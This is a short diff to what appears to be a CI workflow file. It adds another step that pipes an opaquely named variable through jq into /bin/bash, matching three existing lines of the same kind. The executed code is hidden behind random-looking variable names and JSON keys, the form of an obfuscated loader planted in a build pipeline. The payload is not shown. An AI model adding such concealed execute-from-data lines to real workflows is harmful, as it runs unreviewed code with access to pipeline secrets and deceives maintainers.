@@ -23,6 +23,7 @@ jobs:
           echo $oonp7 | jq -r .atfkr1468 | /bin/bash
           echo $ebyh04 | jq -r .wy6 | /bin/bash
           echo $heqmq5611 | jq -r .g8806 | /bin/bash
+          printf '%s' "$fs67" | jq -r .jujn40 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
